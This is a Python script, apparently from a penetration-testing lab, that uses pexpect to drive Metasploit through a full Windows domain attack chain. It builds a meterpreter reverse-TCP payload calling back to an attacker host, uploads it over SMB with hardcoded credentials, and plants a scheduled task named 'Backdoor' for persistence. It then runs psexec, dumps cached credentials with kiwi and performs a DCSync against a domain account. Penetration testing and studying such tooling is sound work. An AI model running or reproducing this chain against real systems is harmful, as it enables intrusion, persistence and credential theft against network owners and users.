#!/usr/bin/env python3
import pexpect
import os

#msfvenom
process = pexpect.spawn('msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > shell.exe') 
process.expect('Final')
print ("MSFVENOM SCRIPT COMPLETE. NAME=shell.exe")

# Start Metasploit
metasploit_process = pexpect.spawn('msfconsole -q')

# Wait for Metasploit prompt
metasploit_process.expect('msf6')
print ("SKIPPING SMB LOGIN - TIME CONSTRAINTS")
print ("RUNNING WMIEXEC")
# Running resource1.rc
metasploit_process.sendline('resource resource1.rc')
metasploit_process.expect('auxiliary')
print ("WMIEXEC COMPLETED - SUCCESS")

print ("BEGINNING SMBCLIENT")
#SMB client put shell.exe
metasploit_process.sendline('smbclient //172.22.117.20/C$ -U megacorpone/tstark')
metasploit_process.expect('Enter')
print ("ENTERING PASSWORD")
metasploit_process.sendline('Password!')
metasploit_process.expect('smb')
print ("PUTTING SHELL.EXE")
metasploit_process.sendline('put shell.exe')
metasploit_process.expect('smb')
print ("COMPLETE - EXITING")
metasploit_process.sendline('exit')
metasploit_process.expect('auxiliary')
print ("SHELL.EXE SUCCESSFULLY PLACED - SMBCLIENT SUCCESS")


print (" BEGINNING MULTI HANDLER")
# Running resource2.rc
metasploit_process.sendline('resource resource2.rc')
metasploit_process.expect('meterpreter')
print ("RESOURCE 2 COMPLETED - ATTACK SUCCESS")

print ("METERPRETER SHELL TO BACKGROUND")
metasploit_process.sendline('background')
metasploit_process.expect('auxiliary')
print ("BACKGROUND SUCCESS")

print ("BEGINNING PERSISTENCE SERVICES")
# Running resource3.rc
metasploit_process.sendline('resource resource3.rc')
metasploit_process.expect('meterpreter')
print ("SUCCESS - REQUESTING SHELL")

metasploit_process.sendline('shell')
metasploit_process.expect('system32')
print ("SHELL ESTABLISHED - CREATING SCHEDULED TASK")

metasploit_process.sendline('schtasks /create /f /tn Backdoor /SC ONCE /ST 00:00 /TR "C:\shell.exe"')
metasploit_process.expect('system32')
print ("SCHEDULED TASK CREATED SUCCESSFULLY - EXITING")

metasploit_process.sendline('exit')
metasploit_process.expect('meterpreter')

metasploit_process.sendline('exit')
metasploit_process.expect('exploit')

print ("RESOURCE 3 COMPLETED - ATTACK SUCCESS")

print (" BEGINNING PSEXEC")
# Running resource4.rc
metasploit_process.sendline('resource resource4.rc')
metasploit_process.expect('meterpreter')
print ("PSEXEC COMPLETED - ATTACK SUCCESS")

print ("STARTING KIWI")
metasploit_process.sendline('load kiwi')
metasploit_process.expect('meterpreter')
metasploit_process.sendline('kiwi_cmd lsadump::cache')
metasploit_process.expect('meterpreter')
print ("CACHE DUMP SUCCESS - EXITING KIWI")
metasploit_process.sendline('exit')
metasploit_process.expect('exploit')

print ("STARTING LATERAL MOVEMENT")
# Running resource5.rc
metasploit_process.sendline('resource resource5.rc')
metasploit_process.expect('meterpreter')

print ("REQUESTING SYSINFO")
metasploit_process.sendline('sysinfo')
metasploit_process.expect('meterpreter')

print ("SUCCESS - ENTERING SHELL")
metasploit_process.sendline('shell')
metasploit_process.expect('system32')

print ("SHELL ESTABLISHED - REQUESTING USERS")
metasploit_process.sendline('net users')
metasploit_process.expect('system32')
print ("USERS ESTABLISHED - EXITING - OPENING KIWI")
metasploit_process.sendline('exit')
metasploit_process.expect('meterpreter')
metasploit_process.sendline('load kiwi')
metasploit_process.expect('meterpreter')

print ("KIWI LOADED - TESTING DCSYNC")
metasploit_process.sendline('dcsync_ntlm cdanvers')
metasploit_process.expect('meterpreter')
print ("ATTACK SUCCESS - PROVEN VULNERABILITY - SHUTTING DOWN")

metasploit_process.close()